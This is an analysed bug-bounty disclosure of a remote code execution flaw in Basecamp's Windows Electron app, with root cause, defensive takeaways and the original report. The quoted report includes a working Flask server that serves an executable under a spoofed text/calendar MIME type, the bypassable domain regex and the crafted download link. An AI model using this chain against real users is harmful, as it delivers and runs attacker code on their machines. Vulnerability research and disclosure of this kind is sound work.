# Remote Code Execution in Basecamp Windows Electron App via Malicious Download Link

## Metadata
- **Source:** HackerOne
- **Report:** 1016966 | https://hackerone.com/reports/1016966
- **Submitted:** 2020-10-23
- **Reporter:** co0sin
- **Program:** Basecamp (HackerOne)
- **Bounty:** Not specified in writeup
- **Severity:** critical
- **Vuln:** Arbitrary File Download and Execution, Regular Expression Bypass, MIME Type Spoofing, Insufficient URL Validation
- **CVEs:** None
- **Category:** memory-binary

## Summary
The Basecamp Windows Electron application contains a critical vulnerability in its file download feature that allows unauthenticated attackers to achieve remote code execution. By bypassing domain validation through subdomain manipulation and spoofing MIME types, an attacker can craft a malicious link that, when clicked by a user, downloads and automatically executes arbitrary executable files.

## Attack scenario
1. Attacker registers a subdomain matching the pattern 'launchpad.dev.attacker-domain.com' to bypass the internal domain whitelist regex
2. Attacker sets up an HTTP server that serves a malicious executable (e.g., file.exe) with Content-Type header set to 'text/calendar'
3. Attacker crafts a post on Basecamp containing the URL: 'http://launchpad.dev.attacker-domain.com/file.exe?attachment=true'
4. Target user views the post within Basecamp Windows Electron application and clicks the malicious link
5. The application downloads the file, recognizing the text/calendar MIME type as a safe 'openable' type and the attachment parameter
6. The executable file is automatically opened/executed on the victim's machine, granting the attacker code execution

## Root cause
Multiple validation bypasses in the download feature: (1) Weak regex pattern for domain whitelisting that only checks specific domain components without anchoring rules, allowing arbitrary subdomains; (2) Client-side MIME type validation trusting server-provided Content-Type headers without verification; (3) Automatic file execution based on MIME type without user confirmation for potentially dangerous file types; (4) No file extension validation or correlation with declared MIME type

## Attacker mindset
An attacker would recognize that Electron applications often have weaker security boundaries than browsers, and would look for ways to bypass simple string matching validations. The attacker exploits the assumption that subdomain enumeration is restricted, then leverages MIME type spoofing to evade file-type checks. The attack is particularly effective because it requires minimal technical sophistication and relies on social engineering (getting users to click links) rather than complex exploits.

## Defensive takeaways
- Implement strict domain whitelisting using full domain matching with proper anchoring, not regex patterns that can be bypassed with subdomain manipulation
- Never trust client-side MIME type declarations from untrusted sources; validate file content independently
- Require explicit user consent before downloading and executing any files, with clear warnings about file types
- Maintain a blacklist of dangerous file extensions (.exe, .com, .bat, .scr, etc.) and prevent their execution regardless of declared MIME type
- Use code signing and certificate validation for any files that are automatically executed
- Implement Content-Disposition header parsing to prevent bypassing file type checks via query parameters
- Audit all Electron application security boundaries and implement proper sandboxing for file operations
- Apply defense-in-depth: validate URL origin, file headers, MIME type consistency, and extension before any execution

## Variant hunting
Check if other MIME types in OPENABLE_MIME_TYPES can be exploited for code execution (e.g., application/x-msdownload, application/x-msdos-program)
Test if other Basecamp applications (mobile, web, macOS) have similar vulnerabilities
Investigate if attachment parameter can be bypassed entirely through other URL manipulation techniques
Examine if other internal URLs or services may have weaker validation patterns
Test Windows shortcuts (.lnk files) with misleading MIME types to achieve execution
Check if the vulnerability extends to other Electron-based 37signals products
Look for similar patterns in other Electron applications' download handlers

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1204.001 - User Execution: Malicious Link
- T1566.002 - Phishing: Spearphishing Link
- T1105 - Ingress Tool Transfer
- T1059.003 - Command and Scripting Interpreter: Windows Command Shell
- T1036.005 - Masquerading: Match Legitimate Name or Location
- T1036.001 - Masquerading: Invalid Code Signature

## Notes
This vulnerability demonstrates critical security flaws in Electron application development, particularly the naive trust in server-provided metadata and weak validation logic. The attack chain is elegant in its simplicity: three separate validation bypasses (regex, MIME type, no user confirmation) compound into complete RCE. The vulnerability likely affects all Basecamp Windows Electron users and requires patching at the client level. The fact that text/calendar is considered 'openable' suggests the developers may have misunderstood which MIME types are safe for automatic execution.

## Full report
<details><summary>Expand</summary>

The Windows application for Basecamp, allows a "Download" feature for images in your posts. Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it's a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.

I was able to craft a link, which when clicked by a user, will be downloaded and executed! 

To get file execution on the user, we bypass the restrictions first:
There is a regular expression which checks for "internal domains", which can easily be bypassed by controlling the subdomain. The host pattern is `/(launchpad\.37signals\.com|launchpad\.(?:dev|test))/` and `/(3\.(?:staging\.)?basecamp\.com|bc3\.(?:dev|test))/`. By controlling the subdomain, and setting it to something like `launchpad.dev.mydomain.com`, we can bypass this regular expression verification.

Since we'll be sending the request to our own server, we simply need to return `text/calendar` as the content-type header. This can be seen in the Electron code in `OPENABLE_MIME_TYPES = new Set(["text/calendar"]);`
And then when adding the URL to your post, simply add the `?attachment=true` to the URL. 


To reproduce, simply register any subdomain that starts with `launchpad.dev.` (mine is `launchpad.dev.████`).
An HTTP server with the needed mimetype header, can be setup with Flask easily with this code:
```
from flask import Flask, send_from_directory
app = Flask(__name__)
@app.route('/<path:path>')
def hello(path):
    return send_from_directory(".", "file.exe", as_attachment=True, mimetype="text/calendar")
if __name__ == '__main__':
    app.run(port=80,host="0.0.0.0")
```

Then add the link to your post with the appropriate `attachment` parameter, as such:
`http://launchpad.dev.█████████/file.exe?attachment=true`

## Impact

Remote code execution on any user which clicks a link on your crafted post through the desktop app.

</details>

---
*Analysed by Claude on 2026-05-12*
